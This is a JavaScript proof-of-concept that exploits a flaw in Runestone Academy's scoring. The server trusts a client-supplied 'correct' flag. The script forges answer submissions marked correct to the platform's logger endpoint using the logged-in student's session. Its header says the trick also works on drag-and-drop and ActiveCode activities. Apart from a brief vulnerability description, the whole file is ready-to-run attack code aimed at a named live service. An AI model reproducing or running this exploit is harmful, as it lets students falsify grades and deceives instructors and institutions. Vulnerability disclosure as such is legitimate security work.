// Proof of Concept: Runestone Academy Client-Side Scoring Vulnerability
//
// This PoC demonstrates that Runestone's backend accepts any MCQ submission as correct
// purely based on client-side input, with no server-side validation of the actual answer.
// Even blatantly invalid answers (e.g., answer:7) are marked as correct if the
// `"correct": "T"` flag is included in the request payload.
//
// Originally developed as an MCQ spoofer, this payload was also found to affect other activity types.
// Vulnerable components share the same underlying trust flaw: the server relies on the
// client to self-report completion and correctness.
//
// Question Types (Activities) Affected:
// - Multiple Choice (mChoice)
// - Drag and Drop
// - ActiveCode

(async () => {
    // Prompt user to enter the question ID (e.g., "challenge-9-2-Square-Rectangle")
    const divId = prompt("Enter Question ID:");

    // Parse assignment ID from the current URL
    const urlParams = new URLSearchParams(window.location.search);
    const assignmentId = urlParams.get("assignment_id") || urlParams.get("_id");

    if (!divId) {
        alert("No question ID entered, run again.");
        return;
    }
    if (!assignmentId) {
        alert("Assignment ID not found.");
        return;
    }

    // Spoofed payload
    await fetch("https://runestone.academy/ns/logger/bookevent", {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": `https://runestone.academy/assignment/student/doAssignment?assignment_id=${assignmentId}`
        },
        credentials: "include",
        body: JSON.stringify({
            event: "mChoice",
            act: "answer:1:correct",
            answer: "1",
            correct: "T",
            div_id: divId,
            course_name: eBookConfig.course,
            clientLoginStatus: true,
            timezoneoffset: 4,
            percent: 1,
            assignment_id: assignmentId
        })
    });

    alert("Spoofed MCQ submission sent. Refresh to update score.");
})();

